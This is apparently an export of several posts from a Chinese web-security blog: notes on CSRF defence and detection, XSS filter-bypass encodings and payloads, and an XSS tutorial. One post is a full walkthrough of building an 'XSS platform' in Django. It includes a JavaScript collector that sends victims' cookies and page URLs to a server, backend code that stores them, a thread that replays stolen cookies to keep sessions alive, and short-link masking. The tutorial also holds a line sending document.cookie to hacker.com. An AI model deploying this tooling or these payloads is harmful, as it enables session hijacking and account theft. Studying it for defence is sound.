Referer&#160;&#160;&#160;&#160;前边我们提到，CSRF伪造的请求与用户正常的请求相比最大的区别就是请求头中的Referer值不同，使用我们可以根据这点来防御CSRF。&#160;&#160;&#160;&#160;在接收请求的服务端判断请求的Referer头是否为正常的发送请求的页面，如果不是，则进行拦截。&#160;&#160;&#160;&#160;不过此方法有时也存在着一定的漏洞，比如可绕过等，所以最好还是使用Token。&#160;&#160;&#160;&#160;判断Referer的一般方法就是利用正则进行判断，而判断Referer的正则一定要写全，不然就会如上所说，可绕过！曾经的Wooyun上就有许多CSRF的漏洞是由于Referer的正则不规范导致。&#160;&#160;&#160;&#160;比如^http\:\/\/a\.com，只验证了是否Referer是否以http://a.com开头，可是没想到我们可以在自己的顶级域名添加一个子域名http://a.com.hacker.com；还有http\:\/\/a\.com\/，通过http://hacker.com/?http://a.com/绕过。以下相关例子均为Referer绕过： WooYun-2015-164067 WooYun-2015-165578 WooYun-2016-166608 WooYun-2016-167674 &#160;&#160;&#160;&#160;有些网站由于历史原因会允许空Referer头，当https向http进行跳转时，使用Html标签(如img、iframe)进行CSRF攻击时，请求头是不会带上Referer的，可以达到空Referer的目的。 3) 验证码&#160;&#160;&#160;&#160;在发送请求前先需要输入基于服务端判断的验证码，机制与Token类似，防御CSRF效果非常好，不过此方法对用户的友好度很差。 4) 关注点&#160;&#160;&#160;&#160;关于CSRF的防护应首先关注高危操作的请求，比如:网上转账、修改密码等，其次应重点关注那些可以散播的，比如：分享链接、发送消息等，再者是能辅助散播的，如取用户好友信息等，因为前者加上后者制造出来的CSRF蠕虫虽不如XSS蠕虫威力大，可是也不可小觑。最后应关注那些高权限账户能够进行的特权操作，如：上传文件、添加管理员，在许多渗透测试中，便是起初利用这点一撸到底。 5) 防御实例：Django的CSRF防御机制&#160;&#160;&#160;&#160;新建个Django项目，打开项目下的settings.py文件，可以看到这么一行代码：django.middleware.csrf.CsrfViewMiddleware这个就是Django的CSRF防御机制，当我们发送POST请求时Django会自动检测CSRF_Token值是否正确。我们把Debug打开，可以看到如果我们的POST请求无CSRF_Token这个值，服务端会返回403报错。现在我们往表单上添加CSRF_Token的验证：123456789101112131415&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=&quot;/login/&quot; method=&quot;post&quot;&gt; &#123;% raw %&#125;&#123;&#123;% endraw %&#125;% csrf_token %&#125; //添加Token &lt;input type=&quot;text&quot; name=&quot;user&quot; /&gt; &lt;input type=&quot;text&quot; name=&quot;pwd&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;登陆&quot; /&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 下图为生成的HTML，可以看到{% csrf_token %}这串代码被Django解析成了一个隐藏的input标签，其中的值为token值，当我们发送请求时必须带上这个值。只有这样Django才会接受POST请求来的数据，否则返回错误，并且原登陆页面的CSRF_Token重新生成，上一个进行销毁，很大程度上防御住了POST请求的CSRF。 补充一张暴漫系列图，引用自先知社区《聊聊CSRF漏洞攻防—-久等的暴漫》作者：farmsec： 0x07 CSRF的常用检测方法1) 黑盒 首先肯定确定是否除Cookie外其他参数均可确定，即：无验证码，无Token等。 再者如果发现是Referer头判断的话，可以尝试是否可以绕过正则。 还有就是考虑能不能绕过Token，比如Url处的Token用加载攻击者服务器上的图片来获取。 最后可以考虑与XSS结合，如：攻击者使用iframe跨域，存在xss漏洞的网站插入的XSS执行代码为eval(window.name)，那么我们构造的iframe标签里可以添加个name属性与子页面进行通信，例子：wooyun-2015-089971。 2) 白盒 查看是否有Token，验证码，Referer等不确定参数判断。 判断Referer的正则是否安全。 判断Token返回的位置是否为安全位置。 判断生成的Token是否足够随机，毫无规律。 从上到下挖掘难度依次递增 0x08 补充说明1) HttpOnly&#160;&#160;&#160;&#160;CSRF攻击不受Cookie的HttpOnly属性影响。 2) XSS漏洞情况下的CSRF&#160;&#160;&#160;&#160;如果一个网站存在XSS漏洞，那么以上针对CSRF的防御几乎失去了作用。 3) 关于Flash的内容&#160;&#160;&#160;&#160;鉴于Flash的凉势，这里暂不做研究以节省时间。 4) 目前CSRF形势&#160;&#160;&#160;&#160;就目前而言，CSRF这个沉睡的巨人颇有一番苏醒的意味，可导致的危害也正在逐步的为人们所知，但目前仍有许多开发人员还没有足够的安全意识，以为只要验证Cookie就能确定用户的真实意图了，这就导致了目前仍有大量潜在的CSRF漏洞的局面，CSRF是不可小觑的漏洞，希望大家看完这篇文章能对CSRF有个较为清晰的认识。 0x09 结束语&#160;&#160;&#160;&#160;这是我在信安之路投稿的第二篇文章，虽说内容较为基础，但也是我熟读几本相关书籍与相关文章、研究已知漏洞，所写出来的一篇半总结，半思考文章，也许里边会有些错误，麻烦各位表哥斧正，如果有想要与我交流相关内容的可以email我(asp-php#foxmail.com #换成@)。&#160;&#160;&#160;&#160;最后欢迎大家多多投稿呀，真的能对自己的学习有很大帮助！ 0x0A 参考书籍：《Web前端黑客技术揭秘》p83-p96《XSS跨站脚本攻击剖析与防御》p182-p187《黑客攻防技术宝典Web实战篇第二版》p368-p374文章:CSRF漏洞挖掘WEB安全之Token浅谈跨域方式及其产生的安全问题Django中CSRF原理及应用详解CSRF简单介绍及利用方法 | WooYun知识库原生JSONP实现_动态加载js（利用script标签）]]></content>
      <categories>
        <category>原创栏目</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于我学XSS躺过的那些坑]]></title>
    <url>%2F2019%2F%E5%85%B3%E4%BA%8E%E6%88%91%E5%AD%A6XSS%E8%BA%BA%E8%BF%87%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91%2F</url>
    <content type="text"><![CDATA[XSS字符编码在学习编码绕过时由于数量多，类型相似，不太容易记得住，记得全，故做此记录。 0x01 Html标签属性中执行简单了解： Html标签属性中的XSS问题多属于javascript伪协议常见的属性有： src lowsrc dynsrc url href action onload onunload onmouseover onerror 各种on开头的事件 PS：此处可不加括号，如onclick=javascript:alert(1),各类教程里常见的&lt;img src=javascript:alert(1)&gt;&lt;/img&gt;Chrome、Firfox已失效，IE测试成功。 在Html标签中，许多标签具有执行javascript的权利，当服务器存在过滤时，我们可以尝试通过以下编码方法绕过： 8/10/16进制转换([.][&amp;#][&amp;#x]) 利用javascript:String.fromCharCode(xx,xx,xx......) [xx为编码的字符串的ASCII码] JScript Encode [IE] JS fuck等 data:text/html;bbase64,xxxxxxx [IE下无效，Chorme、Firefox下均属于空白域，无法获取信息，不过可用作CVE攻击] 0x02 在&lt;script&gt;&lt;/script&gt;中 直接在script标签里执行的情况，我们通常分为以下几种利用方式： 直接导入远程XSS平台脚本 直接在&lt;&gt;&lt;/&gt;中写上自定义攻击脚本，如生成img标签 关于&lt;&gt;&lt;/&gt;中可用： 1) 单个拆开编码成ASCII1eval(String.fromCharCode()) 2) 使用eval()执行16进制转换后的代码12eval(\u0064\u0078......)eval(\x64\x78......) 0x03 在样式表中的编码样式表中可用expression和@import来执行js代码,此方法可进行适当的编码转换。PS:仅在IE8.0之前的版本。 1) expression12全角字符：&lt;div style=xss:ｅｘｐｒｅｓｓｉｏｎ(alert(1))&gt; 12十六进制&lt;div style=xss:\0065ｘｐｒｅｓｓｉｏｎ(alert(1))&gt; 12/**/注释 [Javascript中也行]&lt;div sty/**/le=x/**/ss:\0065ｘｐｒｅ/**/ｓｓｉｏ/**/ｎ(al/**/ert(1))&gt; 2) @import123\和结束符\0会被浏览器忽略@im\po\rt jav\ascr\ipt:al\ert(1)@im\00po\0rt jav\00asc\0000ript:a\00lert(1) 浏览器差异简单记录常见的浏览器差异造成的XSS 0x01 引号的差异只有IE支持反引号 ` 0x02 标签的差异 data协议执行代码是在Chrome下执行 Chrome下srcdoc利用：&lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt; IE下&lt;img src=javascript:alert(1)&gt; 只要火狐支持E4X 0x03 过滤器差异Chrome能拦截大多数反射型XSS，Firefox次之，IE最次 浏览器异常解析BUG产生XSS漏洞 关于调用document在刚开始学习XSS的时候总是想千方百计的想用javascript调用dom对象，比如document.cookie，却不知这个只能在javascript域[伪协议或标签内]范围内。 小知识点一、src等属性在引入时如果漏洞网站协议名于xss平台相同，即可省略去，如：&lt;img src=//www.baidu.com /&gt;二、svg标签属于xml而不属于html三、关于Cors跨域：使用Ajax跨域时默认是不允许带上会话数据的，不过可以在XSS平台通过设置返回的请求头Access-Control-Allow-Credentials: true，并且需要设置xhr的withCreadential属性值为true，注意此时返回的Access-Control-Allow-Origin不能设置为通配符true。四、优先级：function xxx(){}形式定义的函数 -&gt; == -&gt; &amp;五、使用img等合法标签跨域可以带上会话信息六、除javascript外还有vbscript、actionscript等七、P3P协议仅仅是IE浏览器支持,通常是Hacker域名通过iframe或script等载入存在XSS漏洞的网站 与CSRF的区别XSS的恶意请求伪造与CSRF极为相似，两者的差别为： 后者发出的伪造请求可为其他站点发出的，而前者都是存在XSS漏洞的站点发出的 CSRF是XSS无法替代的 CSRF可以无Javascript参与，及在黑客的网站上使用img等标签发送带Cookie(自带)的跨域请求。 关于XSS防御0x01 输出Html标签属性如：&lt;input class=&#39;xxx&#39; value=&quot;{输出}&quot;&gt; 这里的输出如果过滤/转义了&quot;，便不存在XSS漏洞了，因为这里的value属性不能执行js代码。 0x02 输出在注释一定要过滤换行符！！ 0x03 输出在样式表过滤expression和@import还有外部图片的引用 0x04 字符集开头设定好字符集为 UTF-8 0x05 Cookie盗取设置好path、开启http_only、防止调试信息泄露和Apache400漏洞、使用Session]]></content>
      <categories>
        <category>原创栏目</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>个人笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Django简单编写一个XSS平台]]></title>
    <url>%2F2019%2F%E4%BD%BF%E7%94%A8Django%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84XSS%E5%B9%B3%E5%8F%B0%2F</url>
    <content type="text"><![CDATA[1) 简要描述&#160; &#160; &#160; &#160;原理十分简单2333,代码呆萌,大牛勿喷 &gt;_&lt; 2) 基础知识 XSS攻击基本原理和利用方法 Django框架的使用 3) Let’s start0x01&#160; &#160; &#160; &#160;工欲善其事必先利其器，首先我们需要准备编写代码的各种工具和环境，这里不细说。我这里的环境和工具如下： python 3.7.0 pycharm windows 10 mysql 8.0.15 Django 2.1.3 &#160; &#160; &#160; &#160;需要用到的第三方库： django pymysql requests 0x02&#160; &#160; &#160; &#160;我们先看一下XSS脚本是如何工作的 12var website=&quot;http://127.0.0.1&quot;;(function()&#123;(new Image()).src=website+&apos;/?keepsession=1&amp;location=&apos;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return&apos;&apos;&#125;&#125;)())+&apos;&amp;toplocation=&apos;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return&apos;&apos;&#125;&#125;)())+&apos;&amp;cookie=&apos;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return&apos;&apos;&#125;&#125;)())+&apos;&amp;opener=&apos;+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&apos;&apos;&#125;catch(e)&#123;return&apos;&apos;&#125;&#125;)());&#125;)(); &#160; &#160; &#160; &#160;这段代码非常简单，就是通过javascript获取有用信息，然后通过访问xss平台将信息作为GET参数传给服务器。&#160; &#160; &#160; &#160;注意：这里使用AJAX可能会出现CORS跨域问题。 0x03&#160; &#160; &#160; &#160;先给出关键代码，其他都是Django相关的内容，这里不做相关讨论。123456789101112131415161718192021222324&quot;&quot;&quot;根据url值动态返回相应的javascript代码&quot;&quot;&quot;import pymysql,osfrom user.safeio import re_checkdef get_info(url): if not re_check(url,&apos;num_letter&apos;): return &apos;default&apos; db = pymysql.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;root&apos;,&apos;xss&apos;) cursor = db.cursor() cursor.execute(&quot;Select name From projects Where url=&apos;&quot;+url+&quot;&apos;&quot;) js_name = cursor.fetchone()[0] if js_name == None: return &apos;default&apos; else: return (js_name)def get_js_value(url): js_name = get_info(url) file = &apos;\\script\\&apos;+js_name + &apos;.js&apos; js_value = open(os.getcwd()+file).read() js_value = js_value.replace(&apos;&lt;-1234-&gt;&apos;,url) return js_value 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import pymysql,timefrom .getscript import get_infodef connect(): try: db = pymysql.connect(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;xss&apos;) cursor = db.cursor() return db,cursor except: print(&apos;连接数据库失败，正在尝试重新连接&apos;) connect()def put_letter(requests,url): now_time = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;,time.localtime(time.time()))[2:] if &apos;HTTP_X_FORWARDED_FOR&apos; in requests.META: ip = requests.META[&apos;HTTP_X_FORWARDED_FOR&apos;] else: try: ip = requests.META[&apos;REMOTE_ADDR&apos;] except: ip = &apos;0.0.0.0&apos; ip = ip.replace(&quot;&apos;&quot;,&quot;\&apos;&quot;) origin = requests.GET.get(&apos;location&apos;,&apos;Unknown&apos;).replace(&quot;&apos;&quot;,&quot;\&apos;&quot;) software = requests.META.get(&apos;HTTP_USER_AGENT&apos;,&apos;Unknown&apos;).replace(&quot;&apos;&quot;,&quot;\&apos;&quot;) method = requests.method.replace(&quot;&apos;&quot;,&quot;\&apos;&quot;) data = requests.GET.get(&apos;cookie&apos;,&apos;No data&apos;).replace(&quot;&apos;&quot;,&quot;\&apos;&quot;) keep_alive = requests.GET.get(&apos;keepsession&apos;,&apos;0&apos;).replace(&quot;&apos;&quot;,&quot;\&apos;&quot;) list = [now_time,ip,origin,software,method,data,keep_alive] put_mysql(list,url)def put_mysql(list,url): db,cursor = connect() name = get_info(url) cursor.execute(&quot;Select user From projects Where url=&apos;&quot;+url+&quot;&apos;&quot;) user = cursor.fetchone()[0] m_query = &quot;INSERT INTO letters(time,name,ip,origin,software,method,data,user,keep_alive) VALUES(&apos;&#123;0&#125;&apos;,&apos;&#123;1&#125;&apos;,&apos;&#123;2&#125;&apos;,&apos;&#123;3&#125;&apos;,&apos;&#123;4&#125;&apos;,&apos;&#123;5&#125;&apos;,&apos;&#123;6&#125;&apos;,&apos;&#123;7&#125;&apos;,&apos;&#123;8&#125;&apos;)&quot; m_query = m_query.format(list[0],name,list[1],list[2],list[3],list[4],list[5],user,list[6]) cursor.execute(m_query) db.commit() db.close()def get_letters(username): db, cursor = connect() m_query = &quot;SELECT * FROM letters WHERE user = &apos;&#123;&#125;&apos;&quot; m_query = m_query.format(username) cursor.execute(m_query) result_list = cursor.fetchall() return result_list &#160; &#160; &#160; &#160;既然我们知道了xss脚本会将信息构造通过GET的参数形式传给XSS平台，我们只需在服务器接受数据并保存即可。 0x04&#160; &#160; &#160; &#160;我们可以为我们的平台编写新的功能以完善我们的平台，如邮件提醒，cookie活性保持等1234567891011121314151617181920212223242526#coding=utf-8&apos;&apos;&apos;邮件发送&apos;&apos;&apos;import smtplibfrom email.mime.text import MIMETextfrom email.utils import formataddrmy_sender=&apos;xxxx&apos;my_pass = &apos;xxxx&apos;def send_mail(user_mail): try: print(user_mail) msg=MIMEText(&apos;您点的外卖已送达，请登录平台查询&apos;,&apos;plain&apos;,&apos;utf-8&apos;) msg[&apos;From&apos;]=formataddr([&quot;XSS平台&quot;,my_sender]) msg[&apos;To&apos;]=formataddr([&quot;顾客&quot;,user_mail]) msg[&apos;Subject&apos;]=&quot;您点的外卖已送达，请登录平台查询&quot; server=smtplib.SMTP_SSL(&quot;smtp.qq.com&quot;, 465) server.login(my_sender, my_pass) server.sendmail(my_sender,[user_mail,],msg.as_string()) server.quit() except Exception: pass 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&apos;&apos;&apos;使用独立于主线程的其他线程来保持通用项目的cookie信息&apos;活性&apos;默认保持一个小时的活性&apos;&apos;&apos;import requests,queue,time,pymysqlCookie_Time = 1def decrease(time,number): if time &lt; number: time = &apos;0&apos;+str(time) else: time = str(time) return timedef count_time(now_time): global Cookie_Time year = int(now_time[0:2]) month = int(now_time[3:5]) day = int(now_time[6:8]) hours = int(now_time[9:11]) if hours &lt; Cookie_Time: if day == 1: if month == 1: month=12 year -= 1 else: day=30 month -= 1 else: day -= 1 hours += 19 else: hours -= 5 hours = decrease(hours,10) day = decrease(day,10) month = decrease(month,10) year = decrease(year,10) dec_time = (&quot;&#123;0&#125;-&#123;1&#125;-&#123;2&#125; &#123;3&#125;&quot;).format(year,month,day,hours) + now_time[11:] return dec_timedef create_queue(): Cookie_queue = queue.Queue() now_time = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;, time.localtime(time.time()))[2:] dec_time = count_time(now_time) m_query = (&quot;SELECT software,origin,data FROM letters WHERE name=&apos;default&apos; and time&gt;&apos;&#123;&#125;&apos; and keep_alive = &apos;1&apos;&quot;).format(dec_time) db = pymysql.connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;root&apos;,&apos;xss&apos;) cursor = db.cursor() cursor.execute(m_query) return_list = cursor.fetchall() for x in return_list: Cookie_queue.put(x) return Cookie_queuedef action(): while True: time.sleep(60) task_queue = create_queue() while not task_queue.empty(): tasks = task_queue.get() url = tasks[1] ua = tasks[0] cookie = tasks[2] headers = &#123;&apos;User-Agent&apos;: ua, &apos;Cookie&apos;: cookie&#125; try: requests.get(url, headers=headers) except: pass &#160; &#160; &#160; &#160;注意这里需要使用独立于django主线程的子线程，比如我在manager.py里添加了这么一段代码：123456789101112import threadingfrom xssplatform.keep_alive import actionclass keep_Thread(threading.Thread): def __init__(self): super(keep_Thread,self).__init__() def run(self): action()if __name__ == &apos;__main__&apos;: th = keep_Thread() th.start() 短链接：123456789101112131415161718192021222324&apos;&apos;&apos;短链接生成接口c7.gg&apos;&apos;&apos;import requests,jsonHeaders = &#123; &quot;accept&quot; : &quot;application/json, text/javascript, */*; q=0.01&quot;, &quot;accept-encoding&quot; : &quot;gzip, deflate, br&quot;, &quot;accept-language&quot; : &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;content-length&quot; : &quot;53&quot;, &quot;content-type&quot; : &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;origin&quot; : &quot;https://www.985.so&quot;, &quot;referer&quot; : &quot;https://www.985.so/&quot;, &quot;user-agent&quot; : &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&quot;,&#125;def url_to_short(url): global Headers data = &#123;&apos;type&apos;:&apos;c7&apos;,&apos;url&apos;:url&#125; r = requests.post(&apos;https://create.ft12.com/done.php?m=index&amp;a=urlCreate&apos;,data=data,headers=Headers) list = json.loads(r.text) return list[&apos;list&apos;] 4) 最后&#160; &#160; &#160; &#160;其实看起来高大上的XSS平台原理就那么简单，真正难的部分是关于XSS跨站脚本的编写。&#160; &#160; &#160; &#160;此项目已开源于Github，有任何问题可以提交issue，我会在第一时间进行回复。&#160; &#160; &#160; &#160;我不会不断更新此项目，感兴趣的朋友可以多多关注我的博客。]]></content>
      <categories>
        <category>原创栏目</category>
      </categories>
      <tags>
        <tag>Django</tag>
        <tag>XSS</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端Hack之XSS攻击个人学习笔记]]></title>
    <url>%2F2019%2F%E5%89%8D%E7%AB%AFHack%E4%B9%8BXSS%E6%94%BB%E5%87%BB%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[简单概述&#160; &#160; &#160; &#160;此篇系本人两周来学习XSS的一份个人总结，实质上应该是一份笔记，方便自己日后重新回来复习，文中涉及到的文章我都会在末尾尽可能地添加上，此次总结是我在学习过程中所写，如有任何错误，敬请各位读者斧正。其中有许多内容属于相关书籍、文章的部分摘取，如有侵权，请联系我修改。(asp-php#foxmail.com) 1) 什么是XSS?&#160; &#160; &#160; &#160;XSS(Cross-Site Script,跨站脚本)是由于web应用程序对用户的输入过滤不足而产生的一种漏洞。攻击者可以利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码，对受害者产生各种攻击。 &#160; &#160; &#160; &#160;如果对以上描述还不是很了解的话，可以参考百度百科&#160; &#160; &#160; &#160;在余弦大大和xisigr大大的书籍《Web前端安全技术揭秘》第三章中这样说道： 跨站脚本的重点不在“跨站”上，而应该在“脚本”上…因为这个“跨”实际上属于浏览器的特性，而不是缺陷，造成“跨”的假象是因为绝大多数的XSS攻击都会采用嵌入一段远程或者说第三方域上的脚本资源。 &#160; &#160; &#160; &#160;确实，当攻击者的服务器上的js嵌入到受害者的页面，至于接下来的攻击就是关于“脚本”的事了。 2) XSS可以带来哪些危害？&#160; &#160; &#160; &#160;对于XSS攻击的危害，大多数的人们却没有正确的认识，实际上攻击者可以利用XSS攻击造成巨大的危害。比如： 网页挂马; 盗取Cookie; DoS攻击; 钓鱼攻击; 蠕虫攻击; 劫持用户web行为; 结合CSRF进行针对性攻击; ······ 这些都是可以利用XSS漏洞来达成的。 3) XSS类型目前的XSS总共可以分为三种类型： 反射型(也叫非持久型) 存储型(也叫持久型) DOM型 PS：前两种XSS都会与服务器产生交互，后一种不会产生交互。(某安全大佬面试) 反射型XSS&#160; &#160; &#160; &#160;反射型XSS，也称非持久型XSS，最常见也是使用最广的一种。在反射型XSS中，payload一般存在于网页的Url中，只用户单击时触发，只执行一次，非持久化，故称反射型XSS。攻击者发送恶意Url链接让受害者点击(一般会对payload部分进行处理，如：编码转换和短域名跳转) &#160; &#160; &#160; &#160;由于篇幅问题，关于反射型XSS我就不做过多简述。&#160; &#160; &#160; &#160;有的人认为反射型XSS需要用户已经登陆的情况下才能利用，其实不然。我们可以通过反射型xss让浏览器远程嵌入我们的js文件，然后配合浏览器漏洞进行RCE攻击。这里给出个相近的例子：记一次从DOM型XSS到RCE过程。 存储型XSS&#160; &#160; &#160; &#160;存储型XSS，也称持久型XSS，攻击者首先将恶意javascript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意javascript页面就会执行恶意代码，不需要用户点击特定Url就能执行，故存储型XSS比反射型XSS更具威胁性。— 《XSS跨站脚本攻击剖析与防御》&#160; &#160; &#160; &#160;存储型XSS与反射型XSS最大的区别就在于提交的XSS代码会储存于服务端，下次再访问目标页面时不用再提交XSS代码。—《Web前端黑客技术揭秘》 DOM型XSS&#160; &#160; &#160; &#160;许多朋友对反射型XSS和存储型XSS都比较清楚，可是却不太了解什么是DOM型XSS，没关系，看完这里你就应该会对DOM型XSS有个大概认识&#160; &#160; &#160; &#160;DOM,即Document Object Model(文件对象模型)的缩写，关于DOM的概念想了解的朋友可以在百度百科得到相应的解答。&#160; &#160; &#160; &#160;DOM型XSS是如何产生的？我们知道，客户端javascipt是可以访问浏览器的DOM文本对象模型，如果没有经过适当的过滤和消毒，那么应用程序可能会受到基于DOM的XSS攻击。&#160; &#160; &#160; &#160;在刺的《白帽子讲Web安全》是这样讲的： 通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS，也就是DOM型XSS。 &#160; &#160; &#160; &#160;举个简单的例子(来自《Web前端黑客技术揭秘》)：12345678&lt;html&gt;...&lt;script&gt;var a=document.URL;document.write(a.substring(a.indexOf(&quot;a=&quot;)+2,a.length));&lt;/script&gt;...&lt;/html&gt; &#160; &#160; &#160; &#160;把以上代码保存为1.html,然后打开浏览器访问http://127.0.0.1/1.html#a=test&#160; &#160; &#160; &#160;我们知道这是个静态页面，而且#后边的内容并不会传给服务器。&#160; &#160; &#160; &#160;可是这样就不会产生XSS漏洞了吗？如果我们访问http://127.0.0.1/.html#a=&lt;script&gt;alert(/xss/)&lt;/script&gt;&#160; &#160; &#160; &#160;当我们访问上述url时，服务器会返回源代码，我们可以用抓包工具截取，发现与正常访问的页面无差别，可是当浏览器收到源代码时便把HTML文本解析成DOM对象并执行，结果弹出/xss/消息框，感兴趣的朋友可以试试。&#160; &#160; &#160; &#160;具体执行过程如图： 4) XSS的利用方式&#160; &#160; &#160; &#160;前面我们介绍了各种XSS的特点及产生方式，现在我们来说说如何利用这些漏洞。 Cookie窃取&#160; &#160; &#160; &#160;Cookie盗取是xss攻击中最实用也是最广泛的一种利用方式之一。我们知道Cookie是Web系统识别用户的身份和保存会话状态的主要机制，且是由服务器提供的、存储在客户端的一种数据。同时，对于cookie的操作十分的方便，我们可以通过Document对象访问Cookie。如：&lt;script&gt;alert(document.cookie)&lt;/script&gt;会弹出当前页面的cookie信息。 &#160; &#160; &#160; &#160;这里我们引入一个叫做“同源策略”的概念： 首先，同“源”的源不单单是指两个页面的主域名，还包括这两个域名的协议、端口号和子级域名相同。举个例子，假设我现在有一个页面http://www.a.com/index.html，域名是 www.a.com，二级域名为 www,协议是 http，端口号是默认的 80，这个页面的同源情况如下：&#160; &#160; &#160; &#160;同源策略存在的意义就是为了保护用户的信息的安全。一般网站都会把关于用户的一些敏感信息存在浏览器的 cookie 当中试想一下，如果没有同源策略的保护，那么 b 页面也可以随意读取 a 页面存储在用户浏览器 cookie 中的敏感信息，就会造成信息泄露。如果用户的登录状态被恶意网站能够随意读取，那后果不堪设想。由此可见，同源策略是非常必要的，可以说是浏览器安全的基石。&#160; &#160; &#160; &#160;除了 cookie 的访问受到同源策略的限制外，还有一些操作也同样受到同源策略的限制：&#160; &#160; &#160; &#160;(1) 无法读取非同源网页的 Cookie 、sessionStorage 、localStorage 、IndexedDB&#160; &#160; &#160; &#160;(2) 无法读写非同源网页的 DOM&#160; &#160; &#160; &#160;(3) 无法向非同源地址发送 AJAX请求（可以发送，但浏览器会拒绝响应而报错） &#160; &#160; &#160; &#160;————引自晚风表哥在信安之路上的投稿文章《同源策略与跨域请求》 &#160; &#160; &#160; &#160;我们知道Cookie有如下常见的属性： Domain————设置关联Cookie的域名; Expires————通过给定一个过期时间来创建一个持久化Cookie; Httponly————用于避免Cookie被Javascript访问; Name————Cookie的名称; Path————关联到Cookie的路径，默认为/; Value————读写Cookie的值; Secure————用于指定Cookie需要通过安全Socket层传递连接; &#160; &#160; &#160; &#160;并且Cookie也可以安装类型分为： 本地Cookie————即储存在计算机硬盘中，关闭浏览器后依旧存在; 内存Cookie————即储存在内存中，随浏览器的关闭而消失; &#160; &#160; &#160; &#160;如何区分两者很简单，只要判断cookie中的expires即过期时间属性有没有设置，如果设置了即为本地cookie，反之为内存cookie。&#160; &#160; &#160; &#160;由于Cookie具有的不同属性，我们可以将不同属性的Cookie盗取方式分为以下几种情况 默认&#160; &#160; &#160; &#160;默认情况，即不对Cookie的任何属性进行指定就设置Cookie的情况。这种情况下Cookie的获取最为简单。可以通过下列方式获取123&lt;script&gt;new Image().src=&quot;http://www.hacker.com/cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt; 不同域&#160; &#160; &#160; &#160;这是由于domain字段的机制导致的。一个Cookie如果不知道domain的值，则默认为本域。&#160; &#160; &#160; &#160;例如有两个网站www.a.com和test.a.com且后者存在xss漏洞，按照同源策略，这两个网站是不同源的，默认情况下我们无法直接从test.a.com获取到www.a.com的Cookie，可是如果www.a.com的Cookie值中的domain属性设置为父级域即a.com，就可以通过test.a.com的xss漏洞获取到www.a.com的Cookie值。 不同路径&#160; &#160; &#160; &#160;这是由于path字段的机制导致的。在设置Cookie时，如果不指定path的值，默认就是目标页面的路径。比如在www.a.com/admin/index.php设置cookie值且不知道path，那么path默认为/admin/。javascript可以指定任意路径的cookie，但是只有对于path值的目录下才能读取Cookie,即上述例子中只有/admin/目录下的javascipt才能读取前边设置的Cookie。 Http Only&#160; &#160; &#160; &#160;HttpOnly是指仅在Http层面上传输的Cookie，当设置了HttpOnly标志后，客户端脚本就无法读取该Cookie，这样做能有效防御XSS攻击获取Cookie，也是目前防御XSS的主流手段之一。不过利用某些特定方式也可以同样读取到标志了HttpOnly的Cookie。 利用调试信息，如：PHP的phpinfo()和Django的调试信息，里边都记录了Cookie的值，且标志了HttpOnly的Cookie也同样可以获取到。 利用Apache Http Server 400错误暴露HttpOnly Cookie的特点。 感兴趣的朋友可以查阅相关资料(《Web前端黑客技术揭秘》p36-39) Secure&#160; &#160; &#160; &#160;Secure是指设置了Secure的Cookie尽在HTTPS层面上进行安全传输，如果请求是HTTP的，则不会带上改Cookie，这样做的好处是可以降低Cookie对中间人攻击获取的风险，不过对我们此处讨论的XSS攻击无拦截效果，可通过默认情况下获取。 P3P&#160; &#160; &#160; &#160;HTTP响应头的P3P字段可以用于标识是否允许目标网站的Cookie被另一域通过加载目标网站而设置或发送，据说仅IE支持（17年）。&#160; &#160; &#160; &#160;我们来举个例子，在A域通过iframe等方式加载B域(此时也称B域为第三方域)，如果我们想通过B域来设置A域的Cookie，或加载B域时带上B域的Cookie，这时就得涉及到P3P。 B域设置A域Cookie&#160; &#160; &#160; &#160;在IE下默认是不允许第三方域设置的的，除非A域在响应头带上P3P字段。当响应头头带上P3P后，IE下第三方域即可进行对A域Cookie的设置，且设置的Cookie会带上P3P属性，一次生效，即使之后没有P3P头也有效。 加载B域时Cookie传入问题&#160; &#160; &#160; &#160;我们知道Cookie分为内存Cookie和本地Cookie，当我们通过A域加载B域时，默认是带内存Cookie加载(如果无内存Cookie则不带)，而如果想要带本地Cookie加载，则本地Cookie必须带P3P属性。 相关文章：用P3P header解决iframe跨域访问cookie 相关阅读：《Web前端黑客技术揭秘》p41-42 会话劫持&#160; &#160; 